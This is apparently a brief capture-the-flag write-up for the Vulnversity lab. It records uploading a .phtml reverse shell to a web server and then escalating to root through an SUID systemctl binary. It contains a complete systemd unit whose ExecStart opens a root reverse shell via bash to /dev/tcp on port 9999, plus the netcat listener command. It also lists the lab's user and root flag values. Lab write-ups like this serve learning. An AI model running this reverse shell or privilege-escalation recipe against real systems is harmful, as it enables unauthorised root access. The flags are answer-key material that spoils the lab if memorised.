vulneversity
2022-06-20

# gryNet


upload revshell phtml to webserver @ $IP:3333/internal/
execute $IP:3333/internal/uploads/shell.phtml

# privesc

SUID bit on systemctl:

cat root.service
```
[Unit]
Description=privesc

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$IP/9999 0>&1'

[Install]
WantedBy=multi-user.target
```

systemctl enable /tmp/root.service
systemctl start root
nc -lnvp 9999

user.txt:8bd7992fbe8a6ad22a63361004cfcedb
root.txt:a58ff8579f0a9270368d33a9966c7fd5